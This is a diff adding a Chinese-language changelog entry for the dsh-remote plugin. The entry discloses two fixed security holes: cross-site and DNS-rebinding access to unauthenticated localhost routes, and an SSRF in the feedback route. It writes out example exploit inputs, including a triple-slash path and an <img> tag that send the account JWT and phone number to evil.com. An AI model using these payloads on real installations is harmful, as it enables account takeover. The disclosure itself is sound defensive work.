@@ -3,6 +3,42 @@
 All notable changes to dsh-remote are documented here. This project follows
 [Semantic Versioning](https://semver.org/).
 
+## [0.6.18-beta.4] - 2026-09-27
+
+> 接 beta.3。**这是安全修复版**（2026-09-27 全项目安全审计的首批修复），
+> 另外按业主口径放宽了网络延迟分档。
+
+### 🔴 安全：两个已发布的漏洞
+
+1. **本地宿主路由缺跨站防护** → 任意网页可驱动你电脑上的插件。
+   `/dsh-remote/*` 的 40 多条路由注册在**本机** dsh web 上且没有鉴权，靠「只有本机能访问」
+   保证安全 —— 但浏览器里任何网页都能向 `127.0.0.1:3080` 发请求：
+    - CSRF：`evil.com` 用表单 POST `/dsh-remote/self/uninstall`、`/config`；
+    - DNS rebinding：把 `evil.com` 解析到 `127.0.0.1`，浏览器视为同源 → 能**读到**
+      `/dsh-remote/diag/bundle`（含本机路径与配置）与 `/dsh-remote/access-key`（能签发设备密钥）。
+   现在：Host 只认 loopback，且 Origin 与 Host 不同源 / `Sec-Fetch-Site: cross-site` 一律拒。
+   手机端不受影响（隧道请求由 bridge 剥掉这些头，undici 会补 `Host: 127.0.0.1:<port>`）。
+   逃生舱：`DSH_REMOTE_LOCAL_GUARD=0`；反代场景用 `DSH_REMOTE_TRUSTED_HOSTS=a.com,b`。
+
+2. **`/dsh-remote/feedback` 前缀路由 SSRF + 账号凭据外泄** → 一条 GET 即可账号被接管。
+   旧代码把请求路径后缀只剥一个前导斜杠就交给 `new URL()`，于是**三斜杠**退化成协议相对 URL：
+   `GET /dsh-remote/feedback///evil.com/collect` → 实际请求 `https://evil.com/collect`，
+   而插件会在没有 Authorization 时**自动附加本机账号 JWT、真实手机号、device_id**。
+   攻击者只需让浏览器加载一张图（`<img src="http://127.0.0.1:3080/dsh-remote/feedback///evil.com/collect">`）。
+   现在改为 `safeUpstreamUrl()`：剥掉**所有**前导斜杠 + 两道断言（origin 必须一致、
+   pathname 必须在基址路径之下），任何逃逸一律 400，绝不把凭据发出去。
+
+> 这两个洞在中继侧的同类问题（跨租户隧道帧注入）已在服务端修复（relay-router），
+> 无需用户升级也立即生效。
+
+### 🟡 体验：网络延迟分档按业主口径放宽
+
+这类远程访问的**文本窗口**，500ms 以内不叫事、1000ms 用起来也是正常流畅的。
+旧的 120/300 分档照「网页首屏」体感定，会把大量正常可用的移动网络误报成「较慢」。
+
+- 现在：`≤500ms 顺畅 / ≤1000ms 正常 / ≤2000ms 偏慢 / >2000ms 很慢`
+- 「正常」不再渲染成告警色
+
 ## [0.6.18-beta.3] - 2026-09-27
 
 > 接 beta.2。**这一版把手机端右栏彻底还给官方**（业主拍板的「根治」）——
